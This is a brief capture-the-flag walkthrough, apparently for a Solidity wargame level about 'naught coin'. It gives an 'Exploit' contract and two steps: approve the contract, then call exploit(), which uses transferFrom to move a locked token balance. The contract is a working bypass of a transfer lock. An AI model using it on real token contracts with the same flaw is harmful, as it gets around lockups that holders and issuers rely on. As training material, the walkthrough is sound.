Deploy the following contract to the same network, sending your contract instance
```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.4;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";


contract Exploit {
    
    function exploit(address _who) public {
      uint balance = ERC20(_who).balanceOf(msg.sender);
      ERC20(_who).transferFrom(msg.sender, address(this), balance);
    }
}
```
- Call approve() on the naught coin, approving the contract above for your entire balance of naught coin
- Call exploit()
